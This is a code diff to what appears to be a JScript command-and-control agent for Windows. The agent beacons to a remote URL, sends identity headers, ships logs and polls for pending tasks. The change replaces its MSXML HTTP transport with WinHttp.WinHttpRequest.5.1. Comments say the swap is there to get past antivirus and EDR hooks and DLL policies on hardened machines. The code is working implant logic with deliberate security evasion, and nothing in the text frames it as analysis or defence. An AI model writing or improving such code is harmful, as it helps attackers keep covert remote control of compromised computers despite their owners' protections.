@@ -22,15 +22,15 @@ function runAgent() {
         try {
             var bytes = [];
             for (var i = 0; i < line.length; i++) bytes.push(line.charCodeAt(i) & 255);
-            var xhr = new ActiveXObject('MSXML2.ServerXMLHTTP');
-            xhr.open('POST', beaconUrl, false);
+            var xhr = makeTransport();
+            if (!xhr) return;
             try { xhr.setProxy(1, '', ''); } catch (e0) {}
-            xhr.setTimeouts(10000, 10000, 15000, 15000);
+            try { xhr.setTimeouts(10000, 10000, 15000, 15000); } catch (e0b) {}
             for (var h = 0; h < identityHeaders.length; h++) {
                 try { xhr.setRequestHeader(identityHeaders[h][0], identityHeaders[h][1]); } catch (e1) {}
             }
             xhr.setRequestHeader('X-Agent-Log', '1');
-            xhr.send(buildBodyStream([bytes]));
+            sendBody(xhr, buildBodyStream([bytes]));
         } catch (e) {
         } finally { inShip = false; }
     }
@@ -38,6 +38,24 @@ function runAgent() {
         ensureShell();
         var value = shell.ExpandEnvironmentStrings('%' + name + '%');
         return (value == '%' + name + '%') ? '' : value;
+    }
+    // ── transport ───────────────────────────────────────────────────────────
+    // WinHttp.WinHttpRequest.5.1 — winhttp.dll's own object, no MSXML in the
+    // path: immune both to the IE-zone denials plain XMLHTTP suffers and to the
+    // AV/EDR hooks and DLL policy that deny the msxml3/msxml6 ServerXMLHTTP
+    // classes on hardened boxes (0x80070005 "Access is denied" at open()).
+    // Sync-only — all this loop needs. One API difference from the MSXML
+    // objects: send() takes a BSTR or a UI1 safearray, never an ADODB.Stream —
+    // sendBody() reads the stream into its safearray.
+    function makeTransport() {
+        try {
+            var t = new ActiveXObject('WinHttp.WinHttpRequest.5.1');
+            t.open('POST', beaconUrl, false);
+            return t;
+        } catch (e) { return null; }
+    }
+    function sendBody(xhr, stream) {
+        xhr.send(stream ? stream.Read() : '');
     }
     function u32Bytes(n) { return [n & 255, (n >>> 8) & 255, (n >>> 16) & 255, (n >>> 24) & 255]; }
     // ── v3 beacon framing (RAW BINARY bodies) ───────────────────────
@@ -319,14 +337,14 @@ function runAgent() {
     while (!exiting) {
         var xhr = null;
         try {
-            xhr = new ActiveXObject('MSXML2.ServerXMLHTTP');
-            xhr.open('POST', beaconUrl, false);
+            xhr = makeTransport();
+            if (!xhr) return 'fail';
             try { xhr.setProxy(1, '', ''); } catch (e2) {}
-            xhr.setTimeouts(10000, 10000, 15000, 45000);
+            try { xhr.setTimeouts(10000, 10000, 15000, 45000); } catch (e2b) {}
             for (var i = 0; i < identityHeaders.length; i++) {
                 try { xhr.setRequestHeader(identityHeaders[i][0], identityHeaders[i][1]); } catch (e3) {}
             }
-            xhr.send(pendingReplies.length ? buildBodyStream(pendingReplies) : '');
+            sendBody(xhr, pendingReplies.length ? buildBodyStream(pendingReplies) : '');
         } catch (e) {
             return 'fail';
         }
